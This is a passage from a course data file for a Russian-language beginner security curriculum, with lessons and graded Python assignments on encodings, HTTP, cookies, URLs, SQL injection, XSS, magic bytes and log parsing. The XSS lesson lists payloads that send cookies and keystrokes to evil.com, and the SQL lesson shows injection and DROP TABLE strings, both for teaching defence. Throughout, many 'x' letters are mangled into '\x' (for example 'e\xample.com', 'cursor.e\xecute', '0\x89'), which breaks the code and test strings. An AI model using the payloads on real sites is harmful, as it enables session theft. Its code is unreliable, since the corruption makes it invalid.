print(hex(number)[2:])  # ff

# Другие системы → десятичное
print(int('11111111', 2))  # 255
print(int('377', 8))       # 255
print(int('ff', 16))       # 255
\`\`\`

## Ручная конвертация

### Десятичное → двоичное (деление на 2)

\`\`\`python
def to_binary(n):
    """Конвертация десятичного числа в двоичное."""
    if n == 0:
        return '0'
    bits = []
    while n > 0:
        bits.append(str(n % 2))
        n //= 2
    return ''.join(reversed(bits))

print(to_binary(42))  # 101010
\`\`\`

### Двоичное → десятичное (умножение на степени 2)

\`\`\`python
def from_binary(binary_str):
    """Конвертация двоичного числа в десятичное."""
    result = 0
    for i, bit in enumerate(reversed(binary_str)):
        result += int(bit) * (2 ** i)
    return result

print(from_binary('101010'))  # 42
\`\`\`

## Универсальная конвертация

\`\`\`python
def convert_base(number_str, from_base, to_base):
    """Конвертация числа из одной системы в другую."""
    # Сначала в десятичную
    decimal = int(number_str, from_base)
    # Из десятичной в нужную
    if to_base == 10:
        return str(decimal)
    elif to_base == 2:
        return bin(decimal)[2:]
    elif to_base == 8:
        return oct(decimal)[2:]
    elif to_base == 16:
        return hex(decimal)[2:]

print(convert_base('ff', 16, 2))   # 11111111
print(convert_base('101010', 2, 16))  # 2a
\`\`\`

## Применение в ИБ

- **MAC-адреса**: 00:1A:2B:3C:4D:5E (hex)
- **IP-адреса**: 192.168.1.1 (десятичные, но каждый октет — 8 бит)
- **Права файлов в Linux**: chmod 755 (восьмеричная)
- **Цвета в CSS**: #FF5733 (hex)
- **Хеш-суммы**: sha256 выводит 64 hex-символа`,
    duration: 45,
    assignment: {
      title: 'Конвертация систем счисления',
      description: 'На первой строке дано число в виде строки. На второй строке — основание исходной системы (2, 8, 10 или 16). На третьей строке — основание целевой системы (2, 8, 10 или 16). Выведите число в целевой системе счисления (строчными буквами, без префиксов 0b/0o/0x).',
      difficulty: 'medium',
      starterCode: '# Считайте число, исходную и целевую системы\n# Конвертируйте и выведите результат\n\nnumber_str = input()\nfrom_base = int(input())\nto_base = int(input())\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'ff\n16\n10', expectedOutput: '255', description: 'Hex → десятичное' },
        { input: '255\n10\n2', expectedOutput: '11111111', description: 'Десятичное → двоичное' },
        { input: '101010\n2\n16', expectedOutput: '2a', description: 'Двоичное → hex' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 11: Кодирование данных
  // ──────────────────────────────────────────
  {
    slug: 'encoding-methods',
    title: 'Кодирование данных: ASCII, Unicode, UTF-8',
    description: 'ASCII, Unicode, UTF-8, азбука Морзе, таблицы кодировок',
    content: `# Кодирование данных

## ASCII

**ASCII** (American Standard Code for Information Interchange) — кодировка, сопоставляющая символам числа от 0 до 127 (7 бит).

\`\`\`python
# Символ → код
print(ord('A'))  # 65
print(ord('a'))  # 97
print(ord('0'))  # 48

# Код → символ
print(chr(65))   # A
print(chr(97))   # a

# Таблица ASCII для букв
for i in range(65, 91):
    print(f'{chr(i)}: {i}', end='  ')
\`\`\`

Полезные диапазоны:
- 48-57: цифры 0-9
- 65-90: A-Z
- 97-122: a-z

## Unicode и UTF-8

**Unicode** — стандарт, назначающий номер (code point) каждому символу всех языков мира (>149 000 символов).

**UTF-8** — способ кодирования Unicode в байты:
- 1 байт для ASCII (0-127)
- 2 байта для кириллицы, латиницы с диакритикой
- 3 байта для CJK (китайский, японский, корейский)
- 4 байта для эмодзи

\`\`\`python
# Unicode code points
print(ord('А'))   # 1040 (русская А)
print(ord('A'))   # 65 (латинская A) — разные символы!

# UTF-8 кодирование
text = 'Привет'
encoded = text.encode('utf-8')
print(encoded)        # b'\\\xd0\\\x9f\\\xd1\\\x80...'
print(len(encoded))   # 12 байт (2 байта на символ)
print(len(text))      # 6 символов
\`\`\`

## Азбука Морзе

Каждый символ кодируется комбинацией точек и тире:

\`\`\`python
MORSE = {
    'а': '.-', 'б': '-...', 'в': '.--', 'г': '--.', 'д': '-..', 'е': '.',
    'ж': '...-', 'з': '--..', 'и': '..', 'й': '.---', 'к': '-.-',
    'л': '.-..', 'м': '--', 'н': '-.', 'о': '---', 'п': '.--.', 'р': '.-.',
    'с': '...', 'т': '-', 'у': '..-', 'ф': '..-.', 'х': '....', 'ц': '-.-.',
    'ч': '---.', 'ш': '----', 'щ': '--.-', 'ъ': '--.--', 'ы': '-.--',
    'ь': '-..-', 'э': '..-..', 'ю': '..--', 'я': '.-.-',
}

def to_morse(text):
    """Преобразование текста в азбуку Морзе."""
    result = []
    for char in text.lower():
        if char in MORSE:
            result.append(MORSE[char])
        elif char == ' ':
            result.append('/')
    return ' '.join(result)

print(to_morse('сос'))  # ... --- ...
\`\`\`

## Почему кодировки важны для ИБ?

1. **Обход фильтров** — разные кодировки одного символа могут обойти WAF
2. **Гомоглифы** — визуально идентичные символы разных алфавитов (фишинг)
3. **Punycode** — кодирование международных доменов (IDN-атаки)`,
    duration: 45,
    assignment: {
      title: 'ASCII-коды',
      description: 'На единственной строке дана строка ASCII-символов. Выведите через пробел десятичные ASCII-коды каждого символа.',
      difficulty: 'easy',
      starterCode: '# Считайте строку\n# Выведите ASCII-коды через пробел\n\ntext = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'ABC', expectedOutput: '65 66 67', description: 'Заглавные латинские буквы' },
        { input: 'Hi!', expectedOutput: '72 105 33', description: 'Смешанные символы' },
        { input: '01', expectedOutput: '48 49', description: 'Цифры' },
      ],
      points: 10,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 12: HTTP и HTTPS
  // ──────────────────────────────────────────
  {
    slug: 'http-https-basics',
    title: 'HTTP и HTTPS',
    description: 'Методы запросов, заголовки, разница HTTP/HTTPS, TLS-сертификаты',
    content: `# HTTP и HTTPS

## Что такое HTTP?

**HTTP** (HyperText Transfer Protocol) — протокол передачи данных в интернете. Браузер отправляет **запрос**, сервер возвращает **ответ**.

## Методы HTTP-запросов

| Метод | Назначение | Пример |
|-------|-----------|--------|
| GET | Получить данные | Открыть страницу |
| POST | Отправить данные | Отправить форму |
| PUT | Обновить данные | Изменить профиль |
| DELETE | Удалить данные | Удалить аккаунт |

## Структура HTTP-запроса

\`\`\`python
# Пример HTTP-запроса (текстовый формат)
request = """GET /index.html HTTP/1.1
Host: e\xample.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
"""

# Разбор запроса
lines = request.strip().split('\\n')
method, path, version = lines[0].split(' ')
print(f'Метод: {method}')    # GET
print(f'Путь: {path}')       # /index.html
print(f'Версия: {version}')  # HTTP/1.1

# Заголовки
headers = {}
for line in lines[1:]:
    if ':' in line:
        key, value = line.split(': ', 1)
        headers[key] = value
print(headers)
\`\`\`

## Коды ответов

\`\`\`python
status_codes = {
    200: 'OK — запрос успешен',
    301: 'Moved Permanently — ресурс перемещён',
    403: 'Forbidden — доступ запрещён',
    404: 'Not Found — страница не найдена',
    500: 'Internal Server Error — ошибка сервера',
}

def explain_status(code):
    return status_codes.get(code, 'Неизвестный код')

print(explain_status(404))  # Not Found — страница не найдена
\`\`\`

## HTTPS и TLS

**HTTPS** = HTTP + **TLS** (Transport Layer Security). Шифрует всё общение между браузером и сервером.

Что защищает HTTPS:
1. **Конфиденциальность** — данные зашифрованы, третьи лица не могут их прочитать
2. **Целостность** — данные не могут быть изменены при передаче
3. **Аутентификация** — вы точно общаетесь с нужным сервером (сертификат)

## Почему HTTP опасен?

\`\`\`python
# При HTTP всё передаётся открытым текстом!
# Атакующий в той же сети (Wi-Fi) может перехватить:
dangerous_data = {
    'url': 'http://bank.com/login',
    'method': 'POST',
    'body': 'username=ivan&password=secret123'
    # ^ Пароль виден всем в сети!
}

# При HTTPS атакующий видит только:
safe_data = {
    'destination': 'bank.com',
    'encrypted_data': 'a3f8b2c1d4e5...'  # нечитаемо
}
\`\`\`

## Man-in-the-Middle атака

Без HTTPS злоумышленник может:
1. Перехватывать пароли и данные
2. Подменять содержимое страниц
3. Внедрять вредоносный код`,
    duration: 50,
    assignment: {
      title: 'Разбор HTTP-запроса',
      description: 'На вход подаётся HTTP-запрос: первая строка содержит метод, путь и версию через пробел. Далее идут строки с заголовками (Ключ: Значение) до пустой строки. Выведите три строки: метод, путь, значение заголовка Host.',
      difficulty: 'medium',
      starterCode: 'import sys\n\n# Считайте строки HTTP-запроса\n# Выведите: метод, путь, Host\n\nlines = []\nwhile True:\n    line = input()\n    if line == "":\n        break\n    lines.append(line)\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'GET /index.html HTTP/1.1\nHost: e\xample.com\nUser-Agent: Mozilla/5.0\n', expectedOutput: 'GET\n/index.html\ne\xample.com', description: 'Простой GET-запрос' },
        { input: 'POST /api/login HTTP/1.1\nHost: secure.site\nContent-Type: application/json\n', expectedOutput: 'POST\n/api/login\nsecure.site', description: 'POST-запрос' },
        { input: 'DELETE /users/5 HTTP/2\nHost: api.service.io\n', expectedOutput: 'DELETE\n/users/5\napi.service.io', description: 'DELETE-запрос' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 13: Cookies и сессии
  // ──────────────────────────────────────────
  {
    slug: 'cookies-sessions',
    title: 'Cookies и сессии',
    description: 'Аутентификация, хранение состояния, уязвимости cookie',
    content: `# Cookies и сессии

## Проблема: HTTP — stateless протокол

HTTP не хранит состояние между запросами. Каждый запрос независим. Но сайтам нужно знать, кто вы (авторизация, корзина покупок и т.д.).

Решение — **cookies** (куки).

## Что такое cookies?

Cookies — маленькие текстовые данные, которые сервер отправляет браузеру. Браузер хранит их и прикрепляет к каждому следующему запросу.

\`\`\`python
# Сервер отправляет cookie в ответе:
response_headers = {
    'Set-Cookie': 'session_id=abc123; Path=/; HttpOnly; Secure'
}

# Браузер прикрепляет cookie к запросу:
request_headers = {
    'Cookie': 'session_id=abc123'
}

# Разбор строки cookie
def parse_cookies(cookie_string):
    """Разбор строки cookies в словарь."""
    cookies = {}
    for pair in cookie_string.split('; '):
        if '=' in pair:
            key, value = pair.split('=', 1)
            cookies[key] = value
    return cookies

cookie_str = 'session_id=abc123; theme=dark; lang=ru'
print(parse_cookies(cookie_str))
# {'session_id': 'abc123', 'theme': 'dark', 'lang': 'ru'}
\`\`\`

## Сессии

**Сессия** — механизм хранения данных пользователя на сервере. В cookie хранится только идентификатор сессии.

\`\`\`python
import hashlib
import os

# Простая реализация сессий
sessions = {}

def create_session(user_id):
    """Создать новую сессию."""
    session_id = hashlib.sha256(os.urandom(32)).he\xdigest()
    sessions[session_id] = {
        'user_id': user_id,
        'created_at': '2024-01-15 10:30:00',
    }
    return session_id

def get_session(session_id):
    """Получить данные сессии."""
    return sessions.get(session_id)

# Создаём сессию для пользователя
sid = create_session(42)
print(f'Session ID: {sid}')
print(f'Data: {get_session(sid)}')
\`\`\`

## Флаги безопасности cookies

| Флаг | Описание |
|------|----------|
| \`HttpOnly\` | Запрещает доступ из JavaScript (защита от XSS) |
| \`Secure\` | Отправлять только по HTTPS |
| \`SameSite\` | Защита от CSRF-атак |
| \`Path\` | Ограничение пути |
| \`Expires\` | Время жизни cookie |

## Уязвимости cookies

\`\`\`python
# 1. Session Hijacking (перехват сессии)
# Если cookie передаётся по HTTP — его можно украсть
stolen_cookie = 'session_id=abc123'  # перехвачено из сети

# 2. Session Fi\xation (фиксация сессии)
# Атакующий навязывает жертве свой session_id

# 3. XSS + Cookie theft
# Если нет HttpOnly, JavaScript может украсть cookie:
# document.cookie → отправить на сервер атакующего

# Защита: всегда используйте HttpOnly, Secure, SameSite
\`\`\``,
    duration: 50,
    assignment: {
      title: 'Разбор cookies',
      description: 'На единственной строке дана строка cookies в формате "key1=value1; key2=value2; ...". Выведите каждую пару ключ-значение на отдельной строке в формате "ключ: значение", в порядке их появления.',
      difficulty: 'easy',
      starterCode: '# Считайте строку cookies\n# Разберите на пары ключ=значение\n# Выведите каждую пару\n\ncookie_str = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'session=abc123; theme=dark', expectedOutput: 'session: abc123\ntheme: dark', description: 'Два cookie' },
        { input: 'lang=ru', expectedOutput: 'lang: ru', description: 'Один cookie' },
        { input: 'a=1; b=2; c=3', expectedOutput: 'a: 1\nb: 2\nc: 3', description: 'Три cookie' },
      ],
      points: 10,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 14: URL и параметры
  // ──────────────────────────────────────────
  {
    slug: 'url-parameters',
    title: 'URL и параметры',
    description: 'Структура URL, GET/POST параметры, URL-кодирование, манипуляция',
    content: `# URL и параметры

## Структура URL

\`\`\`
https://www.e\xample.com:443/path/page?name=Ivan&age=15#section1
\\_____/ \\_____________/ \\_/ \\_______/ \\_______________/ \\______/
схема       хост       порт   путь      параметры     якорь
\`\`\`

## Разбор URL на Python

\`\`\`python
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote

url = 'https://e\xample.com/search?q=python+security&page=2&lang=ru'

parsed = urlparse(url)
print(f'Схема: {parsed.scheme}')       # https
print(f'Хост: {parsed.hostname}')      # e\xample.com
print(f'Путь: {parsed.path}')          # /search
print(f'Параметры: {parsed.query}')    # q=python+security&page=2&lang=ru

# Разбор параметров
params = parse_qs(parsed.query)
print(params)  # {'q': ['python security'], 'page': ['2'], 'lang': ['ru']}
\`\`\`

## URL-кодирование (Percent Encoding)

Спецсимволы в URL кодируются как %XX (hex-код):

\`\`\`python
from urllib.parse import quote, unquote

# Кодирование
text = 'Привет мир!'
encoded = quote(text)
print(encoded)  # %D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82%20%D0%BC%D0%B8%D1%80!

# Декодирование
decoded = unquote(encoded)
print(decoded)  # Привет мир!

# Частые подмены:
# пробел → %20 или +
# & → %26
# = → %3D
# / → %2F
\`\`\`

## GET vs POST параметры

\`\`\`python
# GET — параметры в URL (видны всем!)
get_url = 'https://site.com/login?username=ivan&password=123'
# ОПАСНО! Пароль виден в:
# - адресной строке браузера
# - логах сервера
# - истории браузера

# POST — параметры в теле запроса (не видны в URL)
post_request = {
    'method': 'POST',
    'url': 'https://site.com/login',
    'body': 'username=ivan&password=123',
    'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
}
# Безопаснее, но всё равно нужен HTTPS!
\`\`\`

## Манипуляция параметрами (Parameter Tampering)

\`\`\`python
# Уязвимый интернет-магазин:
# https://shop.com/buy?item=phone&price=50000
# Атакующий меняет:
# https://shop.com/buy?item=phone&price=1

# Защита: НИКОГДА не доверять параметрам от клиента
# Цена должна браться из базы данных на сервере!

def parse_query_params(query_string):
    """Ручной разбор параметров запроса."""
    params = {}
    for pair in query_string.split('&'):
        if '=' in pair:
            key, value = pair.split('=', 1)
            params[key] = value
    return params

print(parse_query_params('name=Ivan&age=15&city=Moscow'))
# {'name': 'Ivan', 'age': '15', 'city': 'Moscow'}
\`\`\``,
    duration: 50,
    assignment: {
      title: 'Разбор URL-параметров',
      description: 'На единственной строке дан URL. Извлеките все GET-параметры и выведите каждый на отдельной строке в формате "ключ=значение". Если параметров нет, выведите "no params". URL-декодирование не требуется.',
      difficulty: 'medium',
      starterCode: '# Считайте URL\n# Извлеките параметры из query string\n# Выведите каждый параметр\n\nurl = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'https://e\xample.com/search?q=python&page=2', expectedOutput: 'q=python\npage=2', description: 'Два параметра' },
        { input: 'https://e\xample.com/', expectedOutput: 'no params', description: 'Без параметров' },
        { input: 'https://site.com/api?token=abc123', expectedOutput: 'token=abc123', description: 'Один параметр' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 15: SQL-инъекции
  // ──────────────────────────────────────────
  {
    slug: 'sql-injection-basics',
    title: 'SQL-инъекции',
    description: 'Принцип атаки, примеры SQL-инъекций, защита через параметризованные запросы',
    content: `# SQL-инъекции

## Что такое SQL-инъекция?

**SQL-инъекция** — атака, при которой злоумышленник внедряет вредоносный SQL-код через пользовательский ввод. Одна из самых опасных и распространённых уязвимостей (OWASP Top 10).

## Как это работает

\`\`\`python
# Уязвимый код (НИКОГДА ТАК НЕ ДЕЛАЙТЕ!)
username = input("Логин: ")
password = input("Пароль: ")

# Формирование запроса через конкатенацию строк
query = f"SELECT * FROM users WHERE name='{username}' AND pass='{password}'"
print(f"Запрос: {query}")

# Нормальный ввод:
# username: ivan, password: secret123
# SELECT * FROM users WHERE name='ivan' AND pass='secret123'

# Вредоносный ввод:
# username: admin' --
# SELECT * FROM users WHERE name='admin' --' AND pass=''
# Всё после -- это комментарий! Пароль не проверяется!

# Ещё опаснее:
# username: ' OR 1=1 --
# SELECT * FROM users WHERE name='' OR 1=1 --' AND pass=''
# 1=1 всегда true — возвращает ВСЕХ пользователей!
\`\`\`

## Типы SQL-инъекций

### 1. UNION-based

\`\`\`python
# Атакующий может извлечь данные из других таблиц:
malicious_input = "' UNION SELECT username, password FROM admin_users --"

# Результат:
# SELECT * FROM products WHERE name='' UNION SELECT username, password FROM admin_users --'
\`\`\`

### 2. Boolean-based (слепая инъекция)

\`\`\`python
# Атакующий задаёт вопросы «да/нет»:
# input: admin' AND (SELECT LENGTH(password) FROM users WHERE name='admin') > 5 --
# Если страница отображается — длина пароля > 5
\`\`\`

## Защита от SQL-инъекций

### Параметризованные запросы (подготовленные выражения)

\`\`\`python
import sqlite3

conn = sqlite3.connect(':memory:')
cursor = conn.cursor()

# ПРАВИЛЬНО: параметризованный запрос
username = input("Логин: ")
password = input("Пароль: ")

# Знаки ? заменяются безопасно — БД сама экранирует
cursor.e\xecute(
    "SELECT * FROM users WHERE name=? AND pass=?",
    (username, password)
)
# Даже если username = "admin' --", SQL воспримет это как строку!
\`\`\`

### Экранирование спецсимволов

\`\`\`python
def escape_sql(text):
    """Простое экранирование (для демонстрации)."""
    dangerous = ["'", '"', ';', '--', '/*', '*/', '\\\\']
    result = text
    for char in dangerous:
        result = result.replace(char, '')
    return result

# Лучше использовать параметризованные запросы!
\`\`\`

## Последствия SQL-инъекций

1. **Утечка данных** — пароли, личные данные, финансовая информация
2. **Обход аутентификации** — вход без пароля
3. **Изменение данных** — DROP TABLE, UPDATE
4. **Выполнение команд ОС** — в некоторых СУБД`,
    duration: 55,
    assignment: {
      title: 'Обнаружение SQL-инъекций',
      description: 'На единственной строке дан пользовательский ввод. Определите, содержит ли он признаки SQL-инъекции. Проверяйте наличие: одинарная кавычка (\\\'), двойной дефис (--), точка с запятой (;), слова OR/AND/UNION/SELECT/DROP (без учёта регистра) как отдельные слова. Если найден хотя бы один признак — выведите SUSPICIOUS, иначе — SAFE.',
      difficulty: 'medium',
      starterCode: '# Считайте пользовательский ввод\n# Проверьте на признаки SQL-инъекции\n# Выведите SUSPICIOUS или SAFE\n\nuser_input = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: "admin' OR 1=1 --", expectedOutput: 'SUSPICIOUS', description: 'Классическая SQL-инъекция' },
        { input: 'normal_user123', expectedOutput: 'SAFE', description: 'Обычный логин' },
        { input: "'; DROP TABLE users;", expectedOutput: 'SUSPICIOUS', description: 'DROP TABLE атака' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 16: XSS-атаки
  // ──────────────────────────────────────────
  {
    slug: 'xss-basics',
    title: 'XSS-атаки',
    description: 'Отражённый и хранимый XSS, экранирование HTML, Content Security Policy',
    content: `# XSS-атаки

## Что такое XSS?

**XSS** (Cross-Site Scripting) — атака, при которой злоумышленник внедряет вредоносный JavaScript-код на страницу, которую просматривают другие пользователи.

## Типы XSS

### 1. Отражённый (Reflected) XSS

Вредоносный код в URL или параметре запроса:
\`\`\`
https://site.com/search?q=<script>alert('XSS')</script>
\`\`\`

Сервер вставляет параметр в HTML без экранирования, и скрипт выполняется.

### 2. Хранимый (Stored) XSS

Вредоносный код сохраняется на сервере (в БД):
- Комментарий на форуме: \`<script>document.location='https://evil.com/steal?c='+document.cookie</script>\`
- Каждый, кто открывает страницу, выполняет этот скрипт

## Экранирование HTML

\`\`\`python
def escape_html(text):
    """Экранирование HTML-спецсимволов."""
    replacements = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#\x27;',
    }
    for char, escape in replacements.items():
        text = text.replace(char, escape)
    return text

# Без экранирования (ОПАСНО):
user_input = '<script>alert("XSS")</script>'
unsafe_html = f'<p>{user_input}</p>'
# Браузер выполнит скрипт!

# С экранированием (БЕЗОПАСНО):
safe_html = f'<p>{escape_html(user_input)}</p>'
print(safe_html)
# <p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>
# Браузер отобразит как текст, не выполнит
\`\`\`

## Модуль html в Python

\`\`\`python
import html

dangerous = '<script>alert("XSS")</script>'

# Экранирование
safe = html.escape(dangerous)
print(safe)  # &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

# Обратное преобразование
original = html.unescape(safe)
print(original)  # <script>alert("XSS")</script>
\`\`\`

## Что может сделать XSS?

\`\`\`python
# Примеры вредоносных payload (для понимания угрозы):
payloads = [
    # Украсть cookies
    '<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>',
    # Перенаправить пользователя
    '<script>window.location="https://evil-phishing.com"</script>',
    # Изменить содержимое страницы
    '<script>document.body.innerHTML="<h1>Сайт взломан</h1>"</script>',
    # Кейлоггер
    '<script>document.onkeypress=function(e){new Image().src="https://evil.com/log?k="+e.key}</script>',
]
\`\`\`

## Защита от XSS

1. **Экранирование вывода** — \`html.escape()\` для всех пользовательских данных
2. **Content Security Policy (CSP)** — заголовок, запрещающий inline-скрипты
3. **HttpOnly cookies** — скрипты не могут читать cookie
4. **Валидация ввода** — проверка формата данных на сервере`,
    duration: 55,
    assignment: {
      title: 'Экранирование HTML',
      description: 'На единственной строке дан текст, который может содержать HTML-спецсимволы. Экранируйте следующие символы: & → &amp; < → &lt; > → &gt; " → &quot; \\\' → &#\x27; Важно: сначала замените &, затем остальные.',
      difficulty: 'medium',
      starterCode: '# Считайте текст\n# Экранируйте HTML-спецсимволы\n# Выведите результат\n\ntext = input()\n\n# Ваш код здесь\n',
      testCases: [
        { input: '<script>alert("XSS")</script>', expectedOutput: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', description: 'Экранирование тегов и кавычек' },
        { input: 'Hello & goodbye', expectedOutput: 'Hello &amp; goodbye', description: 'Амперсанд' },
        { input: 'safe text', expectedOutput: 'safe text', description: 'Без спецсимволов' },
      ],
      points: 15,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 17: Magic bytes
  // ──────────────────────────────────────────
  {
    slug: 'magic-bytes',
    title: 'Magic bytes: сигнатуры файлов',
    description: 'Определение типа файла по заголовку, сигнатуры популярных форматов',
    content: `# Magic bytes: сигнатуры файлов

## Что такое magic bytes?

**Magic bytes** (магические байты, сигнатура файла) — фиксированная последовательность байт в начале файла, позволяющая определить его тип. Расширение файла можно изменить, но magic bytes — нет (без повреждения файла).

## Популярные сигнатуры

| Формат | Magic bytes (hex) | ASCII |
|--------|-------------------|-------|
| PNG | 89 50 4E 47 | .PNG |
| JPEG | FF D8 FF | ... |
| GIF | 47 49 46 38 | GIF8 |
| PDF | 25 50 44 46 | %PDF |
| ZIP | 50 4B 03 04 | PK.. |
| ELF (Linux) | 7F 45 4C 46 | .ELF |
| EXE (Windows) | 4D 5A | MZ |
| MP3 | 49 44 33 | ID3 |

## Определение типа файла на Python

\`\`\`python
SIGNATURES = {
    bytes([0\x89, 0\x50, 0\x4E, 0\x47]): 'PNG',
    bytes([0\xFF, 0\xD8, 0\xFF]): 'JPEG',
    bytes([0\x47, 0\x49, 0\x46, 0\x38]): 'GIF',
    bytes([0\x25, 0\x50, 0\x44, 0\x46]): 'PDF',
    bytes([0\x50, 0\x4B, 0\x03, 0\x04]): 'ZIP',
    bytes([0\x7F, 0\x45, 0\x4C, 0\x46]): 'ELF',
    bytes([0\x4D, 0\x5A]): 'EXE',
    bytes([0\x49, 0\x44, 0\x33]): 'MP3',
}

def detect_file_type(filename):
    """Определить тип файла по magic bytes."""
    with open(filename, 'rb') as f:
        header = f.read(8)  # читаем первые 8 байт
    for signature, file_type in SIGNATURES.items():
        if header[:len(signature)] == signature:
            return file_type
    return 'UNKNOWN'
\`\`\`

## Работа с байтами в Python

\`\`\`python
# Создание байтов из hex
data = bytes.fromhex('89504e47')
print(data)        # b'\\\x89PNG'
print(data.hex())  # 89504e47

# Побайтовый доступ
for byte in data:
    print(f'{byte:02x}', end=' ')  # 89 50 4e 47

# struct — разбор бинарных данных
import struct

# Упаковка: два 32-битных целых
packed = struct.pack('>II', 1920, 1080)
print(packed.hex())  # 00000780 00000438

# Распаковка
width, height = struct.unpack('>II', packed)
print(f'{width}x{height}')  # 1920\x1080
\`\`\`

## Форензика: скрытые файлы

В CTF часто прячут файл внутри другого:

\`\`\`python
def find_hidden_signatures(filename):
    """Поиск сигнатур файлов внутри бинарных данных."""
    with open(filename, 'rb') as f:
        data = f.read()
    # Ищем PNG-сигнатуру
    png_sig = bytes([0\x89, 0\x50, 0\x4E, 0\x47])
    offset = data.find(png_sig)
    while offset != -1:
        print(f'PNG найден на смещении {offset} (0x{offset:x})')
        offset = data.find(png_sig, offset + 1)
\`\`\`

## Применение в ИБ

1. **Форензика** — определение типа файла без расширения
2. **Обнаружение маскировки** — файл .jpg с сигнатурой EXE = подозрительно
3. **Загрузка файлов** — проверка magic bytes на сервере, а не только расширения`,
    duration: 50,
    assignment: {
      title: 'Определение типа файла',
      description: 'На единственной строке даны hex-байты (через пробел) — первые байты файла. Определите тип файла по сигнатуре и выведите его. Известные сигнатуры: 89504e47 → PNG, ffd8ff → JPEG, 47494638 → GIF, 25504446 → PDF, 504b0304 → ZIP, 4d5a → EXE. Если сигнатура не распознана, выведите UNKNOWN.',
      difficulty: 'hard',
      starterCode: '# Считайте hex-байты\n# Определите тип файла по сигнатуре\n\nhex_bytes = input().split()\n\n# Ваш код здесь\n',
      testCases: [
        { input: '89 50 4e 47 0d 0a 1a 0a', expectedOutput: 'PNG', description: 'PNG-файл' },
        { input: 'ff d8 ff e0 00 10', expectedOutput: 'JPEG', description: 'JPEG-файл' },
        { input: '4d 5a 90 00', expectedOutput: 'EXE', description: 'Windows EXE' },
        { input: '00 00 00 00', expectedOutput: 'UNKNOWN', description: 'Неизвестный формат' },
      ],
      points: 20,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 18: Анализ логов
  // ──────────────────────────────────────────
  {
    slug: 'log-analysis',
    title: 'Анализ логов',
    description: 'Формат логов, поиск аномалий, временные метки, парсинг логов на Python',
    content: `# Анализ логов

## Зачем анализировать логи?

Логи (журналы) — запись событий в системе. Для специалиста по ИБ логи — главный источник информации при расследовании инцидентов.

Логи содержат:
- Кто делал запрос (IP-адрес)
- Когда (временная метка)
- Что запрашивал (URL, метод)
- Какой был результат (код ответа)

## Формат логов веб-сервера (Apache/Nginx)

\`\`\`
192.168.1.100 - - [15/Jan/2024:10:30:45 +0300] "GET /index.html HTTP/1.1" 200 1234
192.168.1.101 - - [15/Jan/2024:10:30:46 +0300] "POST /login HTTP/1.1" 401 89
192.168.1.101 - - [15/Jan/2024:10:30:47 +0300] "POST /login HTTP/1.1" 401 89
192.168.1.101 - - [15/Jan/2024:10:30:48 +0300] "POST /login HTTP/1.1" 200 567
\`\`\`

## Парсинг логов на Python

\`\`\`python
import re

log_pattern = r'(\\S+) - - \\[(.+?)\\] "(\\S+) (\\S+) (\\S+)" (\\d+) (\\d+)'

def parse_log_line(line):
    """Разбор одной строки лога."""
    match = re.match(log_pattern, line)
    if match:
        return {
            'ip': match.group(1),
            'timestamp': match.group(2),
            'method': match.group(3),
            'url': match.group(4),
            'protocol': match.group(5),
            'status': int(match.group(6)),
            'size': int(match.group(7)),
        }
    return None

line = '192.168.1.100 - - [15/Jan/2024:10:30:45 +0300] "GET /index.html HTTP/1.1" 200 1234'
entry = parse_log_line(line)
print(entry['ip'])      # 192.168.1.100
print(entry['status'])  # 200
\`\`\`

## Поиск аномалий

### Брутфорс-атака: множество неудачных входов

\`\`\`python
def detect_bruteforce(log_lines, threshold=5):
    """Обнаружение попыток брутфорса."""
    failed_logins = {}
    for line in log_lines:
        entry = parse_log_line(line)
        if entry and entry['url'] == '/login' and entry['status'] == 401:
            ip = entry['ip']
            failed_logins[ip] = failed_logins.get(ip, 0) + 1
    # Подозрительные IP
    suspicious = {ip: count for ip, count in failed_logins.items()
                  if count >= threshold}
    return suspicious
\`\`\`

### Сканирование: множество 404 ошибок

\`\`\`python
def detect_scanning(log_lines, threshold=10):
    """Обнаружение сканирования сайта."""
    not_found = {}
    for line in log_lines:
        entry = parse_log_line(line)
        if entry and entry['status'] == 404:
            ip = entry['ip']
            not_found[ip] = not_found.get(ip, 0) + 1
    return {ip: count for ip, count in not_found.items()
            if count >= threshold}
\`\`\`

## Временной анализ

\`\`\`python
from datetime import datetime

def parse_timestamp(ts_str):
    """Разбор временной метки из лога."""
    return datetime.strptime(ts_str, '%d/%b/%Y:%H:%M:%S %z')

# Поиск всплесков активности
def find_spikes(log_lines, window_seconds=60, threshold=100):
    """Поиск временных окон с аномально высокой активностью."""
    timestamps = []
    for line in log_lines:
        entry = parse_log_line(line)
        if entry:
            ts = parse_timestamp(entry['timestamp'])
            timestamps.append(ts)
    # Анализ окон...
\`\`\``,
    duration: 55,
    assignment: {
      title: 'Подсчёт IP-адресов в логе',
      description: 'На первой строке дано число N — количество строк лога. Далее идут N строк, каждая начинается с IP-адреса (до первого пробела). Подсчитайте, сколько раз каждый IP встречается, и выведите все уникальные IP в порядке убывания количества (при равенстве — в лексикографическом порядке). Формат: "IP количество".',
      difficulty: 'hard',
      starterCode: '# Считайте N строк лога\n# Подсчитайте частоту IP-адресов\n# Выведите в порядке убывания\n\nn = int(input())\n\n# Ваш код здесь\n',
      testCases: [
